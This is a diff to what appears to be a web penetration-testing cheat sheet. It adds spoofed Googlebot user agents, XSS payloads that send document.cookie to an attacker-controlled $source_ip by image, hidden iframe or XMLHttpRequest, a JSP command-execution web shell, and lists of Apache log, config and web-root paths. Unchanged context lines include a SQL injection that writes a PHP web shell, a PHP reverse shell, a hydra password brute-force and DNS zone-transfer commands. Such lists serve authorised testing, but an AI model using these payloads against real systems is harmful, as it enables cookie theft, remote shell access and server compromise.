@@ -1,6 +1,17 @@
 
 # Web
 
+## User Agents 
+```
+Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+```
+```
+Googlebot/2.1 (+http://www.googlebot.com/bot.html)
+```
+```
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+```
+
 ## SQL Injection Payloads
 ```sql
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
@@ -51,6 +62,12 @@ hydra -l "" -P /mnt/share/wordlists/rockyou.txt -t 1 -v -V $target http-post-for
 ```html
 <script>new Image().src="http://$source_ip/"+document.cookie;</script>
 ```
+```html
+<iframe SRC="http://$source_ip/report" height="0" width="0"></iframe>
+```
+```javascript
+var http = new XMLHttpRequest();var url = "http://$source_ip/";var params = "data=" + document.cookie;http.open("POST", url, true);http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");http.send(params);
+```
 
 ## WebDav
 ```bash
@@ -81,7 +98,9 @@ bash $pwd/tools/web/Kadimus/bin/kadimus -u $target/?pg=contact -A "Mozilla/5.0 (
 ```php
 <?php $sock=fsockopen("$source_ip",$source_port);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
 ```
-
+```jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
 ## DNS
 ```bash
 dnsrecon -d $target -t axfr
@@ -91,4 +110,51 @@ nmap -p 80 --script dns-brute.nse $target
 ```
 ```bash
 python dnscan.py -d $target -w ./subdomains-10000.txt
+```
+
+## Logs
+
+RHEL / Red Hat / CentOS / Fedora Linux Apache log file location   
+```
+/var/log/httpd/access_log
+```
+```
+/var/log/httpd/error_log
+```
+
+Debian / Ubuntu Linux Apache log file location
+```
+/var/log/apache2/access.log
+```
+/var/log/apache2/error.log
+```
+
+FreeBSD Apache log file location
+```
+/var/log/httpd-access.log
+```
+```
+/var/log/httpd-error.log
+```
+
+# Config
+```
+/usr/local/etc/apache2/httpd.conf
+```
+```
+/etc/apache2/apache2.conf
+```
+```
+/etc/httpd/conf/httpd.conf
+```
+
+# Windows web roots
+```
+C:/xampp/htdocs/
+```
+```
+C:/wamp/www/
+```
+```
+C:/Inetpub/wwwroot/
 ```
